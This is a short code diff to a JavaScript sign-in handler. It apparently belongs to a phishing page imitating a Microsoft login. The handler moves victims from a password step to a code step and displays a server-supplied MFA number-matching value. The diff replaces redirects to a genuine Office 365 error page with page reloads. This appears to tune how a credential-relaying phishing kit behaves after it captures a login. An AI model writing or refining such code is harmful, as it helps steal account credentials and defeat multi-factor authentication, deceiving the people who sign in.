@@ -78,8 +78,7 @@ function signIn() {
         setLoader(loaderSignIn, "hidden");
       } else if (response == 1) {
         setLoader(loaderSignIn, "hidden");
-        location.href =
-          "https://outlook.office365.com/Encryption/ErrorPage.aspx?src=0&code=10&be=DM8PR09MB6088&fe=";
+        location.reload()
       } else if (response == 2) {
         changeCard(passwordCard, codeCard);
         setLoader(loaderSignIn, "hidden");
@@ -88,8 +87,7 @@ function signIn() {
         setLoader(loaderSignIn, "hidden");
         document.getElementById("auth-number").textContent = response;
         setTimeout(function () {
-          location.href =
-            "https://outlook.office365.com/Encryption/ErrorPage.aspx?src=0&code=10&be=DM8PR09MB6088&fe=";
+          location.reload()
         }, 60000);
       }
     }
